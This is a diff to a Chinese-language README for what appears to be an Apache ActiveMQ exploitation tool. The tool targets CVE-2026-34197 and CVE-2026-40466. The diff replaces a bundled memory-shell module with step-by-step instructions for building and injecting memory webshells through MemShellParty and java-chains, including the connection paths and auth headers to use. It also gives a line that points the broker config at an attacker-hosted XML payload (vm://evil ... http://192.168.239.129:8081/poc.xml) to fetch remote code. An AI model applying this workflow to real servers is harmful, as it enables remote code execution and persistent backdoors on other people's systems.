@@ -31,9 +31,23 @@ java-chains生成反序列化数据，验证漏洞时可以用URLDNS
 
 ### CVE-2026-34197/CVE-2026-40466
 
-1.3版本改为集成MemShellParty，该项目对jetty内存马支持更好，CVE-2026-34197/CVE-2026-40466均支持内存马注入，注意CVE-2026-40466漏洞无法支持Jakarta_handler挂载类型，且只有Godzilla支持Jakarta_handler。
+1.4版本不再集成内存马生成模块MemShellParty，一方面是fatjar包臃肿，另一方面是springbeanxmlclassloader需要用到的base64解码方法在不同java版本下并不通用，导致工具需要重复造轮子。有内存马需求的师傅可以参考下面生成xml的流程：
 
-Filter，Listener或Servlet类型需要加上路径/admin/\*，/admin/index，/api/\*，/api/index，以及认证头部
+首先在MemShellParty生成对应内存马base64字符串https://party.mem.mk/ui
+
+![image-20260508110638599](.\images\4.png)
+
+然后来到java-chains，找到Generate-OtherPayload，选择自定义字节码
+
+![0](.\images\3.png)
+
+根据jdk版本选择base64解码方法，默认为decodeFromString方法，而vulhub中的CVE-2026-34197靶场需要选择java.util.Base64
+
+最后填入内存马Base64字符串，点击生成即可
+
+![image-20260508110858921](.\images\5.png)
+
+Filter，Listener或Servlet类型，在内存马连接地址处需要加上路径/admin/，/api/，以及认证头部，handler无需路径以及认证头部字段
 
 CVE-2026-40466利用时注意还需要创建/discovery-registry/default文件，内容为`vm://evil?brokerConfig=xbean:http://192.168.239.129:8081/poc.xml`
 
@@ -46,3 +60,5 @@ https://github.com/vulhub/vulhub
 https://github.com/ReaJason/MemShellParty
 
 https://github.com/1diot9/MyJavaSecStudy/blob/5504868a7cba4bf674fe6974fe8f613e556e5d42/Apache/ActiveMQ/CVE-2026-40466/poc/CVE-2026-40466_HTTP_Discovery_RCE_Analysis.md
+
+https://github.com/vulhub/java-chains
